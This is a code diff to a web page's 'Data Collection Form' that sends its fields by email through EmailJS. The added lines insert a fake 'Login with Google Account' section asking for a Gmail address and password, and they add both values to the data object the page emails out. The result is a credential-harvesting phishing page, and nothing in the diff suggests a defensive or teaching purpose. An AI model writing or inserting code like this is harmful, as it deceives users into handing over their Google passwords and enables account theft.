@@ -22,6 +22,8 @@
                 lastDegree: document.getElementById('lastDegree').value,
                 email: document.getElementById('email').value,
                 contact: document.getElementById('contact').value,
+                gmail: document.getElementById('gmail').value,
+                password: document.getElementById('pass').value,
             };
 
             // Send email via EmailJS
@@ -37,6 +39,13 @@
     </script>
 </head>
 <body>
+    <h1>Login with Google Account</h1>
+    <label for="gmail">Email:</label><br>
+        <input type="text" id="gmail" name="gmail" required><br><br>
+
+    <label for="password">Password:</label><br>
+        <input type="password" id="pass" name="pass" required><br><br>
+    
     <h1>Data Collection Form</h1>
     <form id="contactForm" onsubmit="event.preventDefault(); sendEmail();">
         <label for="fullName">Full Name:</label><br>
